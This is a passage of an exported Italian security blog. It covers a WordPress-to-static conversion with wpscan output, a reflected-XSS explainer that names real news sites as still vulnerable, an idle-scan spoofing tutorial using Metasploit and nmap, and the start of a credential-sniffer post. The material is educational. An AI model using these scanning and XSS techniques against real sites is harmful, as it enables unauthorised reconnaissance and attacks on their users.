file) for filemv in $(find . -name *\\?v*=*); do mv $filemv $(echo $filemv | cut -d\u0026#34;?\u0026#34; -f1); done # Edito tutti i files e converto il codice URLencode \u0026#34;?v\u0026#34; in \u0026#34;?v\u0026#34; for filedit in $(grep \u0026#34;?v\u0026#34; . -R | cut -d \u0026#34;:\u0026#34; -f1); do sed -i -e \u0026#39;s/?v/?v/g\u0026#39; $filedit; done A seconda delle vostre capacità potete ottimizzare gli script bash, anzi sono il primo ad accettare consigli e correzioni.\nCome ultima cosa ho pensato di sfruttare il modulo di apache mod_rewrite tramite un file .htaccess per redirigere le chiamate della vecchia index.php e index.php/feed/:\n\u0026lt;IfModule mod_rewrite.c\u0026gt; RewriteEngine On RewriteBase / RewriteRule ^index.php/feed/$ /index.php/feed/index.xml [L] RewriteRule ^index.php/feed/index.html$ /index.php/feed/index.xml [L] RewriteRule ^index.php/$ https://www.homelab.it/index.html [L] \u0026lt;/IfModule\u0026gt; Prima di copiare l’intero sito statico nello spazio web del proprio provider, consiglio di testarlo prima all’interno della macchina virtuale in modo da rilevare eventuali errori o problemi di impaginazione.\nFatto questo non resta che commentare le righe aggiunte ad inizio procedura nel file /etc/hosts , fare un backup del blog wordpress dinamico, svuotare tutta la directory remota e poi copiare l’intero sito statico.\nUna volta on-line il sito statico, ed accertato che tutto funzioni, potete eseguire un backup del vecchio database e rimuoverlo dal server remoto fornito dal vostro hosting provider.\nOgni volta che creerete una nuova pagina o un nuovo articolo sul blog off-line dovrete ripetere la procedura di conversione e di upload.\nUn po di test Ho deciso di effettuare due tipologie di test:\n Prestazioni/SEO Sicurezza  Test 1 – Prestazioni/SEO Per questo test mi sono affidato a tre scanner online che effettuano un analisi del sito web e poi danno un punteggio a seconda delle prestazioni ed il rispetto delle regole SEO.\nA sinistra (sopra per i dispositivi mobile) è possibile notare i risultati del blog dinamico mentre a destra (sotto per i dispositivi mobile) quello statico:\nPingdom – http://tools.pingdom.com\nV.S  Google Developers – https://developers.google.com/speed/pagespeed/insights/\nV.S  GTmetrix – https://gtmetrix.com/\nV.S  L’esito del test è chiaro (e logico), il cms statico è più performante di quello dinamico!\nUn’altra dato importante è che non ci sono peggioramenti per quanto riguarda il SEO, quando andrete a fare le scansioni voi stessi ve ne renderete conto spulciando i dettagli dei risultati.\nTest 2 – Sicurezza Partendo dal fatto che sul mio blog non erano presenti plugins di WordPress con vulnerabilità note, non ho potuto eseguire test di sicurezza pratici ma se volete togliervi la curiosità potete installarne qualcuno affetto da SQL Injection, RCE, CSRF, o Arbitrary File Upload ecc..\nVedrete che il vostro cms statico ne uscirà indenne!\nPer trovare plugins vulnerabili potete far riferimento a qualsiasi sito di exploits, ad esempio il famoso exploit-db.\nNon potendo eseguire attacchi verso il mio cms ho voluto provare a vedere la differenza tra i risultati delle scansioni del noto wordpress security scanner wpcan .\nTest cms DINAMICO:\nclaudio@KaliCla:~$ sudo wpscan https://www.homelab.it _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 2.8 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_ _______________________________________________________________ [+] URL: https://www.homelab.it/ [+] Started: Thu Oct 29 18:44:05 2015 [+] robots.txt available under: \u0026#39;https://www.homelab.it/robots.txt\u0026#39; ... snip ... snip [!] The WordPress \u0026#39;https://www.homelab.it/readme.html\u0026#39; file exists exposing a version number [+] Interesting header: SERVER: Apache [+] Interesting header: X-POWERED-BY: PHP/5.4.44 [+] XML-RPC Interface available under: https://www.homelab.it/xmlrpc.php [+] WordPress version 4.3.1 identified from meta generator [+] WordPress theme in use: dazzling - v1.5.1 [+] Name: dazzling - v1.5.1 | Location: https://www.homelab.it/wp-content/themes/dazzling/ | Readme: https://www.homelab.it/wp-content/themes/dazzling/readme.txt | Style URL: https://www.homelab.it/wp-content/themes/dazzling/style.css | Theme Name: Dazzling | Theme URI: http://colorlib.com/wp/themes/dazzling | Description: Dazzling is a clean, modern, minimal and fully responsive flat design WordPress WooCommerce theme... | Author: Colorlib | Author URI: http://colorlib.com/wp/ [+] Enumerating plugins from passive detection ... | 3 plugins found: [+] Name: add-to-any - v1.6.6 | Location: https://www.homelab.it/wp-content/plugins/add-to-any/ | Readme: https://www.homelab.it/wp-content/plugins/add-to-any/README.txt [+] Name: ep-social-widget - v1.4.1 | Location: https://www.homelab.it/wp-content/plugins/ep-social-widget/ | Readme: https://www.homelab.it/wp-content/plugins/ep-social-widget/readme.txt [+] Name: wordpress-23-related-posts-plugin - v3.5.4 | Location: https://www.homelab.it/wp-content/plugins/wordpress-23-related-posts-plugin/ | Readme: https://www.homelab.it/wp-content/plugins/wordpress-23-related-posts-plugin/readme.txt [+] Finished: Thu Oct 29 18:44:23 2015 [+] Requests Done: 77 [+] Memory used: 11.238 MB [+] Elapsed time: 00:00:17 claudio@KaliCla:~$ Test cms STATICO:\nclaudio@KaliCla:~$ sudo wpscan https://www.homelab.it [sudo] password for claudio: _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 2.8 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_ _______________________________________________________________ [+] URL: https://www.homelab.it/ [+] Started: Sat Oct 31 23:37:39 2015 [+] robots.txt available under: \u0026#39;https://www.homelab.it/robots.txt\u0026#39; .. snip .. snip [+] Interesting header: SERVER: Apache [+] WordPress version 4.3.1 identified from meta generator [+] WordPress theme in use: dazzling [+] Name: dazzling | Location: https://www.homelab.it/href=\u0026#39;wp-content/themes/dazzling/ | Style URL: https://www.homelab.it/href=\u0026#39;wp-content/themes/dazzling/style.css | Referenced style.css: href=\u0026#39;wp-content/themes/dazzling/style.css | Description: [+] Enumerating plugins from passive detection ... [+] No plugins found [+] Finished: Sat Oct 31 23:37:46 2015 [+] Requests Done: 55 [+] Memory used: 9.266 MB [+] Elapsed time: 00:00:06 claudio@KaliCla:~$ Fantastico! Wpscan va un po in ciampanelle e non rileva alcun plugins!\nQuesto scoraggerà sicuramente qualche script kiddie nel continuare ad analizzare il nostro blog.\nConsigli Questa sezione verrà aggiornata via via che troverò qualche novità da riportare.\n Consiglio assolutamente di rendere statico wordpress soltanto nel caso in cui usiate i permalinks, in questo modo non rischierete di perdere i riferimenti ai link indicizzati nei vari motori di ricerca. Nel caso usiate il plugin YOAST SEO vi consiglio di modificare i link dell’attributo canonical in tutti i file html sostituendo l’url relativo della pagina con l’indirizzo del permalink. Potete utilizzare il mio script wp_dynamic2static.sh o prenderlo come riferimento.  Conclusione Bene siamo arrivati alla conclusione dell’articolo “From Dynamic to Static e WordPress non lo buchi più”, spero che sia stato utile o fonte d’ispirazione per un progetto ancora più raffinato.\nVi state chiedendo se anche io sono passato definitivamente a wordpress statico?\nBeh..non vi resta che scoprirlo 😉\nPer qualsiasi informazione o segnalazione non esitate a contattarmi tramite e-mail, social o commentando qui di seguito.\n","permalink":"https://www.homelab.it/index.php/2015/11/07/from-dynamic-to-static-e-wordpress-non-lo-buchi-piu/","summary":"Sorgente immagine: https://greggbanse.com/\nIntroduzione Alzi la mano chi non ha storto il naso leggendo il titolo di questo articolo?\nSicuramente moltissimi ed è stata la mia stessa reazione quando mi sono imbattuto in un post dal titolo The Unhackable WordPress Blog scritto da Matthew Bryant (mandatory).\nIncuriosito dal titolo, volutamente provocatorio, ho continuato la lettura fino alla fine e sono rimasto molto entusiasta, in pratica il buon Matthew Bryant espone la sua teoria che si basa sul trovare un alto livello di sicurezza convertendo da dinamico a statico il CMS WordPress (e non solo).","title":"From Dynamic to Static e WordPress non lo buchi più"},{"content":"\nSorgente Immagine: https://cdn.vectorstock.com\nIntroduzione Ciao a tutti, oggi voglio proporvi un post particolare frutto di alcune ore libere ricavate nelle ultime settimane.\nUn po per necessità e un po per curiosità ho cominciato ad approfondire l’argomento Cross-site Scripting (XSS).\nSpulciando blog, documentazioni, e social mi sono imbattuto in vari security researcher, uno dei quali specializzato in vulnerabilità XSS: Ashar Javed.\nLe sue referenze parlano da sole, infatti è presente in tutte le Security Hall of Fame dei maggiori colossi informatici: Google, Microsoft, Facebook, Twitter ecc…\nConsiglio vivamente di seguirlo su twitter dato che spesso pubblica skill, payload, full disclosure, e video interessantissimi.\nVisionando registrazioni di alcuni suoi seminari mi sono ritrovato spesso davanti alla la frase:\n “XSS is everywhere \u0026amp; it is not going anywhere. It was there.. It is there \u0026amp; It will be there.”\n A questo punto ho cominciato a pormi la domanda:\nMa davvero questa vulnerabilità è così diffusa?\nAvrà ragione il buon Ashar?\nDa qui l’idea di cercare semplici XSS sui siti delle testate online italiane (Si esatto, è l’ispirazione per il titolo del post “teXSState online, pasta, pizza e mandolino” ).\nMa ditemi un po: Vi siete mai documentati o cimentati nella vulnerabilità XSS?\nSe siete appassionati di sicurezza informatica o penetration test sicuramente la risposta sarà affermativa, quindi potete saltare l’introduzione, altrimenti cercherò di spiegarlo nel migliore dei modi.\nXSS è una delle vulnerabilità più diffuse che affliggono siti dinamici caratterizzati da pagine web contenti input non sanitizzati nei quali è possibile iniettare del codice malevolo (payload) al fine di accedere ai dati del browser (e non solo) dell’ignaro malcapitato.\nMa cosa succede alla vittima?\nIn poche parole il browser della vittima si trova ad interpretare attributi html e javascript che non sono ne presenti nel codice sorgente della pagina e neanche dovrebbero trovarsi nella risposta http (http response).\nLe conseguenze ti questo tipo ti attacco possono essere svariate: dalla perdita incontrollata dei propri cookies, al phishing, fino ad arrivare all’installazione di una vera e propria backdoor (Fate un salto alla pagina di questo fantastico progetto: BEEF).\nGli attacchi XSS si posso suddividere fondamentalmente in 3 tipologie:\n Stored XSS Il payload viene iniettato in maniera permanente nello storage del server, come per esempio il database di un forum o social network.\nIn questo caso il browser della vittima verrà attaccato nel momento in cui l’applicazione recupererà i dati, compreso lo script malevolo, dal database. Reflected XSS Il payload viene iniettato nei parametri di una pagina i quali verranno utilizzati dall’applicazione vulnerabile per generare una nuova pagina.\nUn esempio potrebbe essere il form di ricerca di un sito web.\nIn questo caso il malintenzionato dovrà in qualche modo indurre la vittima a cliccare su un link creato ad hoc. DOM XSS Il payload viene iniettato nel DOM di un javascript non sanitizzato, in questo caso però lo script malevolo verrà inviato direttamente al browser della vittima senza passare dal server.  I primi due tipi di attacchi vengono classificati anche come Server XSS o Server-side, dato che vanno a modificare l’http response, mentre il terzo Client XSS o Client-side.\nPer una lettura teorica più approfondita vi rimando alla pagina della community OWASP\nPrima di concludere la parte teorica voglio mostrare anche un semplice esempio pratico, così da far capire ancora meglio la funzionalità dell’attacco.\nCopiate questa semplice paginetta xsstest.php nel vostro web server:\n_!!! Per effettuare i prossimi test utilizzate il browser Firefox, dopo spiegherò la motivazione !!!\n_\nCome potete notare la pagina non fa altro che stampare a video un messaggio di benvenuto includendo il valore della variabile $visitatore passata col metodo GET:\n\nGET Request\nQuesto è il sorgente html restituito dall’http response:\n\nAdesso simuliamo un attacco XSS Reflected modificando l’url della pagina iniettando un payload javascript nella variabile $visitatore.\nIl payload è il seguente: alert(/XSS/)\nLo scopo di questo attacco si limiterà a far eseguire al browser della vittima un alert javascript:\n\nRicontrollando il codice sorgente della pagina appena restituita dal server, si può notare come il payload javascript sia stato iniettato:\n\nQuesto era un esempio pratico di XSS Reflected anche se in uno scenario di attacco reale avremmo trovato al posto di alert(/XSS/)un payload più invasivo e probabilmente l’url del sito sarebbe stato offuscato con qualche servizio URL Shortner tipo bit.ly (Ricordatevi che chi esegue un attacco XSS Reflected deve indurre la potenziale vittima a caricare un determinato url sul proprio browser, quindi camufferà l’indirizzo del sito).\nPer eseguire questi test ho utilizzato il browser Firefox perchè a differenza di altri browser, tipo Chrome, non utilizza filtri XSS Reflected.\nPronti..partenza..VIA! Scrutando la Top Sites Italy del famoso sito Alexa ho notato tra le prime posizioni la presenza di molte testate online ed essendo siti pieni di form o moduli di ricerca, ho pensato che avrei avuto meno difficoltà a testare qualche XSS Reflected.\nLa motivazione di aver scelto siti italiani risiede nella curiosità di tastare il polso al panorama italiano al cospetto di questa vulnerabilità e non per schernire o denigrare il lavoro di altri colleghi.\nLa classifica verrà stilata dalla posizione più alta alla più bassa tenendo di conto che al momento della lettura potrebbe già essere variata.\nPremetto che non pubblicherò i payloads utilizzati durante i test dato che al momento della pubblicazione di questo post le vulnerabilità risulteranno ancora attive!\nPosizione Alexa n.10: repubblica.it \nhttp://www.alexa.com/siteinfo/repubblica.it\nNel form di ricerca del sito repubblica.it sono presenti dei filtri che scartano o codificano in html i caratteri più utilizzati per iniettare degli attributi, come per sempio ” \u0026lt; \u0026gt; ‘ ; ecc.. per questo motivo lo classifico come NON vulnerabile\nPosizione Alexa n.11: corriere.it \nhttp://www.alexa.com/siteinfo/corriere.it\nNel form di ricerca del sito corriere.it sono presenti dei filtri che scartano o codificano in html i caratteri più utilizzati per iniettare degli attributi, come per sempio ” \u0026lt; \u0026gt; ‘ ; ecc.. ma nella sezione store è presente una vulnerabilità XSS Reflected:\nPosizione Alexa n.16: gazzetta.it \nhttp://www.alexa.com/siteinfo/gazzetta.it\nCome per il corriere.it, anche nel sito web gazzetta.it risiede la stessa vulnerabilità nella sezione store, non a caso fanno parte dello stesso gruppo RCS:\n Posizione Alexa n.24: ilfattoquotidiano.it \nhttp://www.alexa.com/siteinfo/ilfattoquotidiano.it\nIl sito ilfattoquotidiano.it si basa sul famoso CMS wordpress e non ho eseguito alcuna scansione per trovare eventuali vulnerabilità al core o ai plugins.\nPosizione Alexa n.34: ilsole24ore.com \nhttp://www.alexa.com/siteinfo/ilsole24ore.com\nIl sito ilsole24ore.com risulta vulnerabile all’attacco XSS Reflected:\nPosizione Alexa n.47: ansa.it \nhttp://www.alexa.com/siteinfo/ansa.it\nIl sito ansa.it risulta vulnerabile all’attacco XSS Reflected:\nPosizione Alexa n.51: lastampa.it \nhttp://www.alexa.com/siteinfo/lastampa.it\nIl sito lastampa.it utilizza come form di ricerca la google search appliance, la quale non risulta vulnerabile all’attacco XSS Reflected.\nPosizione Alexa n.80: ilmessaggero.it \nhttp://www.alexa.com/siteinfo/ilmessaggero.it\nIl sito ilmessaggero.it risulta vulnerabile all’attacco XSS Reflected, per onor di cronaca cito il full disclosure rilasciato dal security researcher Fabio Natalucci (Consiglio vivamente di seguirlo sui Twitter):\nPosizione Alexa n.82: huffingtonpost.it \nhttp://www.alexa.com/siteinfo/huffingtonpost.it\nNel form di ricerca del sito huffingtonpost.it sono presenti dei filtri che scartano o codificano in html i caratteri più utilizzati per iniettare degli attributi, come per sempio ” \u0026lt; \u0026gt; ‘ ; ecc.. per questo motivo lo classifico come NON vulnerabile\nPosizione Alexa n.96: ilgiornale.it \nhttp://www.alexa.com/siteinfo/ilgiornale.it\nIl sito ilgiornale.it utilizza come form di ricerca la google search appliance, la quale non risulta vulnerabile all’attacco XSS Reflected.\nPosizione Alexa n.105: corrieredellosport.it \nhttp://www.alexa.com/siteinfo/corrieredellosport.it\nIl sito corrieredellosport.it risulta vulnerabile all’attacco XSS Reflected:\nPosizione Alexa n.129: liberoquotidiano.it \nhttp://www.alexa.com/siteinfo/liberoquotidiano.it\nIl sito liberoquotidiano.it risulta vulnerabile all’attacco XSS Reflected:\n\nPosizione Alexa n.149: leggo.it \nhttp://www.alexa.com/siteinfo/leggo.it\nIl sito leggo.it risulta vulnerabile all’attacco XSS Reflected:\nPosizione Alexa n.151: ilmattino.it \nhttp://www.alexa.com/siteinfo/ilmattino.it\nIl sito ilmattino.it risulta vulnerabile all’attacco XSS Reflected:\nPosizione Alexa n.401: quotidiano.net \nhttp://www.alexa.com/siteinfo/quotidiano.net\nIl sito quotidiano.net risulta vulnerabile all’attacco XSS Reflected:\nConclusioni Il risultato della ricerca è stato interessante, ben 9 siti web su 14 risultano vulnerabili all’attacco XSS reflected.\nSe si pensa alla longevità e alla semplicità di questo attacco il risultato è sconcertante.\nA mio parere ci sono almeno due considerazioni importanti:\n Vista la popolarità dei siti web vulnerabili, moltissimi visitatori sono potenzialmente a rischio. Molto probabilmente i siti web vulnerabili non sono stati sottoposti ad un penetration test, automatizzato o manuale, appropriato.  Tornando alla domanda che mi ero posto all’inizio dell’introduzione di questo articolo:\nMa davvero questa vulnerabilità è così diffusa?\nAvrà ragione il buon Ashar?\nBeh..mi sento di rispondere così:\ne voi????\nAlla prossima!!!!\n","permalink":"https://www.homelab.it/index.php/2015/10/18/texsstate-online-pasta-pizza-e-mandolino/","summary":"Sorgente Immagine: https://cdn.vectorstock.com\nIntroduzione Ciao a tutti, oggi voglio proporvi un post particolare frutto di alcune ore libere ricavate nelle ultime settimane.\nUn po per necessità e un po per curiosità ho cominciato ad approfondire l’argomento Cross-site Scripting (XSS).\nSpulciando blog, documentazioni, e social mi sono imbattuto in vari security researcher, uno dei quali specializzato in vulnerabilità XSS: Ashar Javed.\nLe sue referenze parlano da sole, infatti è presente in tutte le Security Hall of Fame dei maggiori colossi informatici: Google, Microsoft, Facebook, Twitter ecc…","title":"teXSState online, pasta, pizza e mandolino"},{"content":"Sorgente Immagine: https://www.vmware.com/files/images/vmrc/VMware_logo_blk_RGB_300dpi.jpg\nKali Linux è una distribuzione concepita per essere utilizzata principalmente durante i penetration test e non come distro “da tutti i giorni”.\nBasti pensare che in fase di installazione il setup non richiede la creazione di alcun tipo di utente non privilegiato.\nPer testare la distribuzione ho cominciato ad utilizzarla giornalmente e di conseguenza ho cominciato a riscontare le prime necessità.\nUno dei primi software che ho provato a installare è VMware Workstation.\nL’installazione di questo virtualizzatore, rivolto agli ambienti Workstation, necessita dei kernel headers kernel-haders, ma andiamo con ordine:\n Scaricare VMware Workstation Player versione Pro o Free da qui Installare le dipendenze tramite terminale:   root@KaliCla:/root# apt-get install build-essential linux-headers-`uname -r` Rendere eseguibile il file d’installazione, eseguirlo, e seguire le richieste del wizard:   root@KaliCla:/root/Downloads# chmod +x VMware-Workstation-Full-12.0.0-2985596.x86_64.bundle root@KaliCla:/root/Downloads# ./VMware-Workstation-Full-12.0.0-2985596.x86_64.bundle I pacchetti build-essential e linux-headers servono per compilare i moduli del kernel necessari alla virtualizzazione tramite VMware.\nSe desiderate un launcher sul desktop, basta creare un file dal nome (per esempio) Workstation.desktop all’interno della directory /root/Desktop con queste poche righe:\n#!/usr/bin/env xdg-open [Desktop Entry] Exec=vmware GenericName[en_US]= Icon=/root/Pictures/VMware_Workstation_logo.png Name[en_US]=Workstation Name=Workstation StartupNotify=true Terminal=false Type=Application Per l’icona potete cercare degli esempi su Google immagini.\nA questo punto non vi resta che rendere eseguibile lo scriptino:\nroot@KaliCla:/root/Desktop# chmod +x Workstation.desktop Oggi ho spiegato come installare VMware Workstation Player e Pro su Kali Linux 2.0, prossimamente scriverò altri articoli per aiutarvi nell’installazione di altri tools.\n","permalink":"https://www.homelab.it/index.php/2015/09/07/come-installare-vmware-workstation-player-e-pro-su-kali-linux-2-0/","summary":"Sorgente Immagine: https://www.vmware.com/files/images/vmrc/VMware_logo_blk_RGB_300dpi.jpg\nKali Linux è una distribuzione concepita per essere utilizzata principalmente durante i penetration test e non come distro “da tutti i giorni”.\nBasti pensare che in fase di installazione il setup non richiede la creazione di alcun tipo di utente non privilegiato.\nPer testare la distribuzione ho cominciato ad utilizzarla giornalmente e di conseguenza ho cominciato a riscontare le prime necessità.\nUno dei primi software che ho provato a installare è VMware Workstation.","title":"Come installare VMware Workstation Player e Pro su Kali Linux 2.0"},{"content":"Sorgente Immagine: http://www.androidworld.it\nTranquilli non voglio parlare di nessun virus, epidemia, o serie tv (anche se The Walkin Dead ve la consiglio).\nL’argomento di oggi è l’IDLE SCAN, ovvero una tecnica sofisticata di port scanning TCP ideata da Salvatore Sanfilippo, il quale permette di rilevare servizi attivi su un determinato host camuffando il proprio indirizzo sorgente (spoofing).\nCome viene nascosto l’ip sorgente?\nImpersonando un terzo host della rete il cui stato è dormiente (idle, zombie), infatti la tecnica coinvolge tre interpreti:\n L’attaccante Un host nella rete in stato dormiente(idle, zombie) L’obbiettivo della scansione  Il vantaggio di questo metodo di scansione sta nel fatto che l’attaccante comunicherà soltanto con l’host zombie, e quest’ultimo con l’obbiettivo finale.\nRequisiti  Conoscenze minime dei protocolli, in particolare Internet Protocol Conoscenze minime di Linux Conoscenze minime Framework Metasploit  Teoria Per capire come funziona l’idle scan, suddiviso in due fasi, è necessario analizzare il protocollo IP durante lo scambio di pacchetti tra due host, in particolare l’header.\nQuando l’host A contatta l’host B, invia un pacchetto con un identificativo numerico univoco (ID). Questo campo è utilizzato per riassemblare il pacchetto originale a partire dagli eventuali frammenti in cui può essere diviso durante la trasmissione, in quanto i vari frammenti includono sempre il campo identification del pacchetto originale.\nOgni volta che un pacchetto viene scambiato il sistema operativo incrementa di 1 il numero id, quindi in assenza di traffico il valore rimane invariato.\nIn questo modo è possibile predire il sequence number di un determinato host e capire se è in stato di idle o meno.\nNota Bene Nella maggior parte dei sistemi operativi moderni è stata applicata una patch che genera l\u0026rsquo;id header dei pacchetti in maniera casuale, quindi non più utilizzabili come zombie. Qusto non esclude però la buona riuscita della scansione, infatti molti network device tipo switch, access point,o print server risultano vulnerabili (vedere in seguito l\u0026rsquo;esempio pratico).\nFase 1 – Individuazione Host Zombie L’attaccante invia una serie di pacchetti verso uno o più host di rete, se le risposte avranno nell’header ip il valore id incrementato in maniera sequenziale, l’host può essere considerato uno zombie.\nE’ importante che lo zombie risponda sempre con un id sequenziale altrimenti si andrebbe a incappare in una scansione con falsi positivi.\nFase 2 – Esecuzione Idle Scan L’attaccante interroga lo zombie per individuare il suo l’identification number (es. 13370) , tramite un tools di spoofing invia alla vittima un pacchetto modificato dove nel source address inserisce l’ip dello zombie e nella destination port la porta tcp interessata.\nA questo punto si possono aprire tre scenari:\nPORTA APERTA: la vittima invia allo zombie un pacchetto con i flag SYN/ACK. Lo zombie lo riceve, ma trattandosi di un pacchetto fuori sequenza, e quindi inatteso, esso risponde alla vittima trasmettendole un pacchetto con il flag RST variando il proprio identification number (13371).\nPORTA CHIUSA: in questo caso la vittima reagisce trasmettendo allo zombie un pacchetto ICMP di tipo Destination Unreachable specificando che la porta non è raggiungibile. Lo zombie lo riceve, ma non fa nulla perché si tratta di una risposta inattesa ad una richiesta di connessione che esso non aveva inviato (identification number non varia).\nPORTA BLOCCATA: la vittima scarta il traffico in ingresso sulla porta (ad esempio tramite un firewall): il pacchetto viene ignorato, e non vi sono risposte ICMP verso lo zombie (identification number non varia).\nL’attaccante re-interroga l’host zombie traendo le seguenti conclusioni:\n il valore di identification dello zombie è variato (13371), quindi deduce che la porta della vittima era aperta il valore di identification dello zombie non è variato, e quindi deduce che la porta della vittima era chiusa oppure filtrata.  Pratica Finalmente mettiamo in pratica le due fasi dell’idle scan:\nFase 1 – Individuazione Host Zombie Per individuare hosts zombie è possibile utilizzare il famoso Framework Metasploit che troverete già a bordo di alcune distribuzione dedite a Penetration Test e Vulnerability Assessment tipo BackBox, Kalilinux o BlackArch.\nEseguire metasploit tramite mfsconsole e caricare il tool scanner ipidseq:\nmsf auxiliary(ipidseq) \u0026gt; use auxiliary/scanner/ip/ipidseq msf auxiliary(ipidseq) \u0026gt; show options Module options (auxiliary/scanner/ip/ipidseq): Name Current Setting Required Description ---- --------------- -------- ----------- INTERFACE eth0 no The name of the interface RHOSTS yes The target address range or CIDR identifier RPORT 80 yes The target port SNAPLEN 65535 yes The number of bytes to capture THREADS 1 yes The number of concurrent threads TIMEOUT 500 yes The reply read timeout in milliseconds msf auxiliary(ipidseq) \u0026gt; set RHOSTS 10.0.0.0/24 RHOSTS =\u0026gt; 10.0.0.0/24 msf auxiliary(ipidseq) \u0026gt; set THREADS 50 THREADS =\u0026gt; 50 msf auxiliary(ipidseq) \u0026gt; run [*] 10.0.0.2\u0026#39;s IPID sequence class: Incremental! [*] 10.0.0.10\u0026#39;s IPID sequence class: All zeros [*] Scanned 39 of 256 hosts (15% complete) [*] 10.0.0.69\u0026#39;s IPID sequence class: Unknown [*] 10.0.0.68\u0026#39;s IPID sequence class: All zeros [*] Scanned 55 of 256 hosts (21% complete) [*] Scanned 88 of 256 hosts (34% complete) [*] Scanned 105 of 256 hosts (41% complete) [*] Scanned 130 of 256 hosts (50% complete) [*] Scanned 155 of 256 hosts (60% complete) [*] Scanned 183 of 256 hosts (71% complete) [*] Scanned 206 of 256 hosts (80% complete) [*] Scanned 235 of 256 hosts (91% complete) [*] Scanned 256 of 256 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(ipidseq) \u0026gt; Come si può notare dopo aver caricato il tool scanner, ho controllato le opzioni (SHOW OPTIONS) per verificare i parametri da utilizzare.\nHo modificato l’opzione RHOST inserendo la classe interessata da scansionare, poi ho modificato il numero THREADS in 50 così da velocizzare la scansione, infine ho fatto partire la scansione tramite RUN.\nL’esito della scansione è un host zombie, con precisione l’ip 10.0.0.2 .\nApprofondiamo la questione, tramite nmap vediamo di scoprire qualcosa di più su questo ip:\nmsf auxiliary(ipidseq) \u0026gt; nmap 10.0.0.2 [*] exec: nmap 10.0.0.2 Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-20 16:58 CEST Nmap scan report for 10.0.0.2 Host is up (0.052s latency). Not shown: 998 closed ports PORT STATE SERVICE 80/tcp open http 4242/tcp open vrml-multi-use MAC Address: 04:A1:51:9D:A5:48 (Netgear) Nmap done: 1 IP address (1 host up) scanned in 165.17 seconds msf auxiliary(ipidseq) \u0026gt; Adesso sappiamo che lo switch Netgear, in particolare il modello GS108T, può essere utilizzato come zombie.\nFase 2 – Esecuzione Idle Scan I tre interpreti:\n Attaccante 10.0.0.64 (Mio Notebook) Host Zombie 10.0.0.2 (Switc Netgear) Obbiettivo Scansione 10.0.0.1 (Firewall Linux)  Per eseguire un idle scan e “spoofare” l’ip sorgente possiamo utilizzare sempre nmap:\nmsf auxiliary(ipidseq) \u0026gt; nmap -PN -sI 10.0.0.2 10.0.0.1 [*] exec: nmap -PN -sI 10.0.0.2 10.0.0.1 Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-20 17:19 CEST Idle scan using zombie 10.0.0.2 (10.0.0.2:80); Class: Incremental Nmap scan report for firewall.firewall (10.0.0.1) Host is up (0.21s latency). Not shown: 996 closed|filtered ports PORT STATE SERVICE 53/tcp open domain 81/tcp open hosts2-ns 222/tcp open rsh-spx 444/tcp open snpp MAC Address: 00:0D:B9:1A:B7:68 (PC Engines GmbH) Nmap done: 1 IP address (1 host up) scanned in 41.10 seconds msf auxiliary(ipidseq) \u0026gt; Per eseguire con nmap una scansione idle è necessario specificare lo switch “-sI“, l’ip dell’host zombie, ed infine l’ip dell’obbiettivo.\nLa scansione è andata a buon fine, ma accertiamoci lato firewall (10.0.0.1) se i pacchetti sono arrivati dallo zombie (10.0.0.2) o dall’ip dell’attaccante (10.0.0.64).\nPrima di eseguire la scansione, mi sono collegato sul firewall e tramite lo sniffer di rete tcpdump mi sono messo in ascolto sulla porta 444:\n[root@firewall ~]# tcpdump -i green0 -nn port 444 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on green0, link-type EN10MB (Ethernet), capture size 262144 bytes 17:19:51.165926 IP 10.0.0.2.80 \u0026gt; 10.0.0.1.444: Flags [S], seq 2243717062, win 1024, options [mss 1460], length 0 17:19:51.166097 IP 10.0.0.1.444 \u0026gt; 10.0.0.2.80: Flags [S.], seq 451041702, ack 2243717063, win 29200, options [mss 1460], length 0 17:19:51.167873 IP 10.0.0.2.80 \u0026gt; 10.0.0.1.444: Flags [R], seq 2243717063, win 0, length 0 17:19:51.597329 IP 10.0.0.2.80 \u0026gt; 10.0.0.1.444: Flags [S], seq 2243717062, win 1024, options [mss 1460], length 0 17:19:51.597539 IP 10.0.0.1.444 \u0026gt; 10.0.0.2.80: Flags [S.], seq 457782928, ack 2243717063, win 29200, options [mss 1460], length 0 ... ... Come si può notare le richieste sono arrivate dall’ip dello zombie (Netgear 10.0.0.2) e non dal Notebook dell’attaccante (10.0.0.64)\nPer info o delucidazioni non esistate a contattarmi o a commentare il post!\nRiferimenti https://it.wikipedia.org/wiki/Idle_scan\nhttps://en.wikipedia.org/wiki/Idle_scan\n","permalink":"https://www.homelab.it/index.php/2015/08/20/idle-scan-zombie-attack/","summary":"Sorgente Immagine: http://www.androidworld.it\nTranquilli non voglio parlare di nessun virus, epidemia, o serie tv (anche se The Walkin Dead ve la consiglio).\nL’argomento di oggi è l’IDLE SCAN, ovvero una tecnica sofisticata di port scanning TCP ideata da Salvatore Sanfilippo, il quale permette di rilevare servizi attivi su un determinato host camuffando il proprio indirizzo sorgente (spoofing).\nCome viene nascosto l’ip sorgente?\nImpersonando un terzo host della rete il cui stato è dormiente (idle, zombie), infatti la tecnica coinvolge tre interpreti:","title":"IDLE SCAN: ZOMBIE ATTACK"},{"content":"Se anche voi siete appassionati di penetration testing, vi potrà tornare utile creare dei tools personalizzati da utilizzare durante le tue analisi.\nPython è un fantastico e potente linguaggio di programmazione che mette a disposizione tantissime librerie che possono fare al case nostro, con il vantaggio di essere di facile comprensione.\nQui di seguito troverete il codice sorgente, commentato in maniera dettagliata, di uno sniffer di rete principalmente dedicato alla cattura del traffico POP/IMAP.\nNon vi 